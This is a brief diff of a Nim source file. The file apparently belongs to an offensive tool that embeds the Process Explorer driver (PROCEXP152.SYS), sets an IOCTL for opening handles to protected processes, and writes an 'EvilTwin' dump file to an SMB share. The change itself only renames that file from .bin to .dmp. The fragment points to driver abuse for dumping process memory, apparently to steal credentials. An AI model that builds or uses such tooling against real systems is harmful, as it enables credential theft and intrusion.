@@ -4,7 +4,7 @@ import std/[strformat, strutils, dynlib, tables, net, os]
 
 const serverIP = "0.0.0.0"
 const serverPort = 6500
-const smbShare = fmt"\\{serverIP}\Share\EvilTwin.bin"
+const smbShare = fmt"\\{serverIP}\Share\EvilTwin.dmp"
 
 const procExp = staticRead("PROCEXP152.SYS")
 const IOCTL_OPEN_PROTECTED_PROCESS_HANDLE = cast[uint32](0x8335003c)
